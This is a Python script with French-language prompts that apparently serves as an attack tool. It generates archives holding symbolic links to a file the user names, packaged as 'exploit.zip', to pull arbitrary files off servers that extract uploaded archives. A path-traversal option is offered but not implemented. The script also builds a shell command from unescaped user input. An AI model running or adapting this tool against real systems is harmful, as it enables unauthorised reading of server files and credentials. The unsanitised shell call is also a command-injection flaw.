"""
list prompt example
"""
#from __future__ import print_function, unicode_literals

#from pprint import pprint

from PyInquirer import prompt, Separator

import os
import subprocess
import sys
import tempfile

#from examples import custom_style_2

questions = [
    {
        'type': 'list',
        'name': 'attaque',
        'message': 'Quelle attaque voulez-vous effectuer ?',
        'choices': [
            'Information Diclosure (via les liens symboliques)',
            'LFI ou RCE (via un Path Traversal)'
        ],
    },
    {
        'type': 'input',
        'name': 'fichier',
        'message': 'Quel fichier voulez-vous récupérer ?',
        'when': lambda answers: answers['attaque'] == 'Information Diclosure (via les liens symboliques)'
    },
    {
        'type': 'confirm',
        'name': 'depth',
        'message': 'Ajouter des niveaux de profondeur ?',
        'default': False,
        'when': lambda answers: answers['attaque'] == 'Information Diclosure (via les liens symboliques)'
    },
    {
        'type': 'input',
        'name': 'start',
        'message': 'De ?',
        'when': lambda answers: answers['attaque'] == 'Information Diclosure (via les liens symboliques)' and answers['depth'],
    },
    {
        'type': 'input',
        'name': 'end',
        'message': 'À ?',
        'when': lambda answers: answers['attaque'] == 'Information Diclosure (via les liens symboliques)' and answers['depth'],
    },
    {
        'type': 'checkbox',
        'name': 'os',
        'message': 'Quel type de chemin voulez-vous générer ?',
        'choices': [
            {
                'name': 'Linux',
                'checked': True
            },
            {
                'name': 'Windows',
            },
        ],
        'when': lambda answers: answers['attaque'] == 'Information Diclosure (via les liens symboliques)' \
                            and answers['depth'],
    },
    {
        'type': 'checkbox',
        'name': 'type',
        'message': 'Quel type d\'archive voulez-vous générer ?',
        'choices': [
            {
                'name': '.zip',
                'checked': True
            },
            {
                'name': '.tar',
            },
            {
                'name':  '.7z',
            },
            {
                'name':  '.rar',
            }    
        ],
    },
]


def infodisclosure(answers):
    directory = 'InformationDisclosure'
    if not os.path.isdir(directory):
        os.mkdir(directory)

    # create a temporary directory
    #with tempfile.TemporaryDirectory() as tmp:
     #   print(f'[+] The created temporary directory is {tmp}')
    name = answers['fichier'].replace('/','_').replace('\\','_')
    if name.count('.'):
        dst = directory + '/' + '.'.join(name.split('.')[:-1]) + '_symlink.' + name.split('.')[-1]
    else:
        dst = directory + '/' + name + '_symlink'
    #    try:
    os.symlink(answers['fichier'],dst)
    #    except FileExistsError:
    #        while True:
    #            res = input('[+] Le lien symbolique existe déjà, voulez-vous le remplacer ? (Y/n) : ').lower()
    #            if res == '' or res == 'y' or res == 'yes':
    #                os.remove(dst)
    #                os.symlink(answers['fichier'],dst)
    #                break
    #            elif res == 'n' or res == 'no':
    #                sys.exit()
    return dst.replace(directory + '/','')

def toZip(fichier):
    os.chdir('InformationDisclosure')
    os.system("zip --symlink exploit.zip " + fichier)

def main():
    answers = prompt(questions)
    if answers['attaque'] == 'Information Diclosure (via les liens symboliques)': 
        res = infodisclosure(answers)
    if '.zip' in answers['type']:
        toZip(res)
        print('Done.')

if __name__ == '__main__':
    main()
